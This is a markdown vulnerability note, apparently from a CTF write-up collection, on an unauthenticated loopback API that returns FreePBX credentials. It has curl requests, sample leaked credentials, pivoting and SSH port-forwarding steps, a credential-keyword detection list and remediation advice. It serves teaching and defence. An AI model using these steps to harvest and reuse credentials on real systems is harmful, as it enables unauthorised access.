```markdown
# Unauthenticated API Credential Leak

**Tags:** `#api` `#credential-leak` `#information-disclosure` `#misconfiguration`

**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

**OWASP:** A01:2021 – Broken Access Control

**Severity:** High (CVSS ~7.5)

---

## Description

An internal API endpoint returns sensitive credentials in its response without requiring any authentication, trusting that only authorized users can reach the loopback-bound service.

---

## Vulnerable Pattern

```bash
curl http://127.0.0.1:3000/api/config
```

Response:
```json
{
  "telephony_user": "FreePBXUCPTemplateCreator",
  "telephony_pass": "St4yN0t1c3d_2026",
  "telephony_portal": "http://127.0.0.1:8080/ucp",
  "automation_endpoint": "http://127.0.0.1:9000",
  "ops_note": "UCP still on default template creds -- ROTATE."
}
```

The API requires no authentication header, token, or key — just network access to the loopback interface.

---

## Attack Payloads

**1. Direct API call from local shell:**
```
curl http://127.0.0.1:3000/api/config
```

**2. Extract credentials and pivot:**
Use the returned username and password to log into the FreePBX UCP portal. Use the automation endpoint info to target port 9000.

**3. Combine with port forwarding for remote exploitation:**
```
ssh -L 3000:127.0.0.1:3000 user@target -N
curl http://127.0.0.1:3000/api/config
```

---

## Detection

**Static:** Search for API responses containing `password`, `secret`, `key`, `credential`, `token` fields. Flag endpoints without authentication decorators.

**Dynamic:** After gaining any local access, probe all internal APIs for credential leakage.

---

## Remediation

1. Require authentication on all API endpoints — even internal ones
2. Never return credentials in API responses — use secure credential distribution mechanisms
3. Audit API responses for sensitive data before deployment
4. Use the principle of least privilege — APIs should only return data the caller needs

---

## Rooms Seen

| Room | Context | Date |
|------|---------|------|
| Infinity Pool (Hacker Holidays 2026) | Watchtower `/api/config` returned FreePBX credentials and automation endpoint URL with no authentication | Aug 2026 |

---

## Related

- Loopback Service Without Authentication — why the API was accessible
- Default Credentials Not Rotated — the credentials returned were default template accounts
- Self-Documenting Health Endpoint — another API information disclosure on port 9000
```
